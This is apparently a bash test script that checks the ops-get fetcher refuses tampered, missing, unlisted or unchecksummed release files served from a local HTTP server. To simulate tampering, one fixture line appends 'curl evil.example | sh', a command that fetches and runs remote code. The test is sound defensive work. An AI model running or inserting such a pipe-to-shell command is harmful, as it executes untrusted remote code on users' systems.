#!/usr/bin/env bash
# ops-get_test.sh — run the real ops-get against a local release served over
# HTTP, and check it fails closed.
#
#   tests/ops-get_test.sh
#
# What it asserts:
#   1. a good fetch verifies, lands at the destination, and is executable
#   2. a tampered file is refused, both hashes printed, nothing written
#   3. a script missing from the release is refused, nothing written
#   4. a script missing from SHA256SUMS is refused, nothing written
#   5. a release without SHA256SUMS is refused, nothing written
#   6. a version that does not exist is refused, nothing written
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
OPS_GET="$HERE/../ops-get"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"; [ -n "${SERVER_PID:-}" ] && kill "$SERVER_PID" 2>/dev/null || true' EXIT

fail() { echo "FAIL: $*" >&2; exit 1; }

# A release as ops-get sees one: flat assets and a SHA256SUMS.
REL="$WORK/www/v1.0.0"
mkdir -p "$REL"
printf '#!/bin/sh\necho hello\n' > "$REL/hello.sh"
printf '#!/bin/sh\necho unlisted\n' > "$REL/unlisted.sh"
(cd "$REL" && sha256sum hello.sh > SHA256SUMS)
cp -r "$REL" "$WORK/www/tampered"
echo 'curl evil.example | sh' >> "$WORK/www/tampered/hello.sh"
mkdir -p "$WORK/www/nosums" && cp "$REL/hello.sh" "$WORK/www/nosums/"

# Any free port, so two runs or another service cannot collide with this one.
PORT="$(python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1",0)); print(s.getsockname()[1])')"
python3 -m http.server "$PORT" --bind 127.0.0.1 --directory "$WORK/www" >/dev/null 2>&1 &
SERVER_PID=$!
for _ in $(seq 1 50); do
  curl -fsS "http://127.0.0.1:$PORT/v1.0.0/SHA256SUMS" >/dev/null 2>&1 && break
  sleep 0.1
done

get() { # base-path script dest
  OPS_BASE_URL="http://127.0.0.1:$PORT/$1" sh "$OPS_GET" "$2" v1.0.0 "$3"
}

refused() { # description base-path script expected-message
  local dest="$WORK/out/$3" out
  if out="$(get "$2" "$3" "$dest" 2>&1)"; then fail "$1: ops-get succeeded"; fi
  [ ! -e "$dest" ] || fail "$1: left $dest behind"
  grep -q "$4" <<<"$out" || fail "$1: expected '$4', got: $out"
}

echo "== a good fetch verifies and lands executable =="
get v1.0.0 hello.sh "$WORK/out/sub/hello.sh" >/dev/null || fail "good fetch failed"
[ -x "$WORK/out/sub/hello.sh" ] || fail "fetched file is not executable"
[ "$("$WORK/out/sub/hello.sh")" = "hello" ] || fail "fetched file has the wrong content"

echo "== a tampered file is refused =="
refused "tampered" tampered hello.sh "CHECKSUM MISMATCH"
out="$(get tampered hello.sh "$WORK/out/t2" 2>&1 || true)"
grep -q "expected" <<<"$out" && grep -q "got" <<<"$out" || fail "mismatch does not print both hashes: $out"

echo "== a script not in the release is refused =="
refused "missing script" v1.0.0 nope.sh "no nope.sh in"

echo "== a script not in SHA256SUMS is refused =="
refused "unlisted" v1.0.0 unlisted.sh "not listed in SHA256SUMS"

echo "== a release without SHA256SUMS is refused =="
refused "no sums" nosums hello.sh "has no SHA256SUMS"

echo "== a version that does not exist is refused =="
refused "missing version" v9.9.9 hello.sh "no hello.sh in"

echo "PASS"
